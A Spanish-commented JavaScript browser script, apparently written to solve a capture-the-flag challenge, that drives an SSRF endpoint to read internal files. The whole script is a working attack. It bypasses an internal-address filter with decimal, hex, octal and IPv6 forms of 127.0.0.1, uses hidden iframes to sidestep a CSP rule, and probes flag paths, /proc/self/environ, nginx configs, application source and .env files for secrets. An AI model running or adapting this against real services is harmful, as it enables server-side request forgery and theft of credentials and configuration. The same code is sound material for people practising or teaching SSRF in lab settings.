// Panel de resultados
var panel = document.createElement('div');
panel.style = 'position:fixed;top:0;left:0;width:100%;height:100%;overflow:auto;background:#0a0a0a;color:#00ff00;font-family:monospace;font-size:12px;padding:20px;z-index:99999';
document.body.appendChild(panel);

function log(msg, color) {
  color = color || '#00ff00';
  panel.innerHTML += '<div style="color:' + color + ';margin:2px 0">' + msg + '</div>';
  panel.scrollTop = panel.scrollHeight;
}

// Extraer contenido util de respuesta SSRF (viene en XML o JSON)
function parseResponse(text) {
  // Si contiene XML del SSRF
  var bodyMatch = text.match(/<body>(.*?)<\/body>/s);
  if (bodyMatch) return decodeHTMLEntities(bodyMatch[1]);
  
  // Si es JSON directo
  try {
    var json = JSON.parse(text);
    return JSON.stringify(json);
  } catch(e) {}
  
  // Texto plano
  return text;
}

function decodeHTMLEntities(text) {
  return text
    .replace(/&amp;/g, '&')
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/&apos;/g, "'");
}

function classifyResponse(text) {
  var lower = text.toLowerCase();
  if (text.includes('HCRD{') || text.includes('HCRD_')) return 'FLAG';
  if (lower.includes('403') || lower.includes('forbidden')) return '403';
  if (lower.includes('404') || lower.includes('not found')) return '404';
  if (lower.includes('connection refused')) return 'REFUSED';
  if (lower.includes('not allowed') || lower.includes('internal addresses')) return 'FILTERED';
  if (lower.includes('name resolution') || lower.includes('errno -3')) return 'DNS_FAIL';
  if (lower.includes('timeout') || lower.includes('timed out')) return 'TIMEOUT';
  if (text.length < 50) return 'EMPTY';
  return 'HIT';
}

// Todas las variantes de IP que bypasean el filtro
var IPS = [
  '2130706433',      // 127.0.0.1 decimal
  '0x7f000001',      // hex
  '0177.0.0.1',      // octal
  '127.1',           // short
  '[::1]',           // IPv6
  '[::ffff:127.0.0.1]', // IPv6 mapped
];

// Todos los nombres posibles del archivo flag
var FLAG_NAMES = [
  '/flag.txt',
  '/flag',
  '/flag.php',
  '/flag.html',
  '/.flag',
  '/.flag.txt',
  '/secret.txt',
  '/secret',
  '/secret/flag.txt',
  '/the_flag.txt',
  '/flag_is_here.txt',
  '/FLAG.txt',
  '/FLAG',
];

// Path traversal para encontrar flag fuera del webroot
var TRAVERSAL_PATHS = [
  // Raiz del sistema
  '/../flag.txt',
  '/../../flag.txt',
  '/../../../flag.txt',
  // Rutas absolutas comunes en Docker/CTF
  '/app/flag.txt',
  '/app/../flag.txt',
  '/var/www/flag.txt',
  '/var/www/html/flag.txt',
  '/home/app/flag.txt',
  '/home/user/flag.txt',
  '/root/flag.txt',
  '/srv/flag.txt',
  '/opt/flag.txt',
  '/tmp/flag.txt',
  // Variables de entorno (pueden tener la flag)
  '/proc/self/environ',
  '/proc/self/cmdline',
  // Config nginx (revela rutas reales)
  '/etc/nginx/nginx.conf',
  '/etc/nginx/sites-enabled/default',
  '/etc/nginx/conf.d/default.conf',
  // Codigo fuente app
  '/app/app.py',
  '/app/main.py',
  '/app/server.py',
  '/app/config.py',
  '/app/.env',
  '/.env',
];

// Usar iframe para cargar sin fetch (evita CSP connect-src)
function ssrfViaIframe(ip, path, callback) {
  var url = '/check?url=' + encodeURIComponent('http://' + ip + path) + '&t=' + Date.now();
  var iframe = document.createElement('iframe');
  iframe.style.display = 'none';
  iframe.src = url;
  
  var done = false;
  iframe.onload = function() {
    if (done) return;
    done = true;
    try {
      var content = iframe.contentDocument.body.innerText || 
                   iframe.contentDocument.body.innerHTML || '';
      callback(null, content, url);
    } catch(e) {
      callback(e, '', url);
    }
    setTimeout(function() { 
      try { document.body.removeChild(iframe); } catch(e) {}
    }, 1000);
  };
  
  iframe.onerror = function() {
    if (done) return;
    done = true;
    callback(new Error('iframe error'), '', url);
  };
  
  // Timeout de 8 segundos
  setTimeout(function() {
    if (done) return;
    done = true;
    callback(new Error('timeout'), '', url);
    try { document.body.removeChild(iframe); } catch(e) {}
  }, 8000);
  
  document.body.appendChild(iframe);
}

// Cola de tareas para no saturar
var queue = [];
var running = 0;
var MAX_CONCURRENT = 3;

function enqueue(ip, path) {
  queue.push({ip: ip, path: path});
  processQueue();
}

function processQueue() {
  while (running < MAX_CONCURRENT && queue.length > 0) {
    var task = queue.shift();
    running++;
    ssrfViaIframe(task.ip, task.path, function(err, content, url) {
      running--;
      if (err && err.message === 'timeout') {
        log('⏱️ TIMEOUT: ' + url.split('url=')[1], '#888');
      } else if (!err) {
        var parsed = parseResponse(content);
        var status = classifyResponse(parsed);
        
        if (status === 'FLAG') {
          log('🚩🚩🚩 FLAG ENCONTRADA: ' + parsed, '#ffff00');
          alert('FLAG: ' + parsed);
        } else if (status === 'HIT') {
          log('✅ HIT [' + url.split('2130706433')[1]?.split('&')[0] + ']:', '#00ff00');
          log('   ' + parsed.substring(0, 300), '#ffffff');
        } else if (status === '403') {
          log('🔒 403: ' + url.split('url=')[1]?.split('&')[0], '#ff8800');
        } else if (status === 'FILTERED') {
          log('🚫 FILTERED: ' + url.split('url=')[1]?.split('&')[0], '#ff0000');
        }
        // No loguear 404, REFUSED, DNS_FAIL para no saturar
      }
      processQueue();
    });
  }
}

// FASE 1: Buscar flag con IP decimal (la que sabemos que funciona)
log('=== FASE 1: Buscando flag con variantes de nombre ===', '#00ffff');
FLAG_NAMES.forEach(function(name) {
  enqueue('2130706433', name);
});

// FASE 2: Path traversal
log('=== FASE 2: Directory traversal ===', '#00ffff');
TRAVERSAL_PATHS.forEach(function(path) {
  enqueue('2130706433', path);
});

// FASE 3: Otras IPs por si acaso
log('=== FASE 3: Otras variantes de IP ===', '#00ffff');
IPS.slice(1).forEach(function(ip) {
  enqueue(ip, '/flag.txt');
  enqueue(ip, '/flag');
});

log('Total tareas en cola: ' + queue.length, '#888');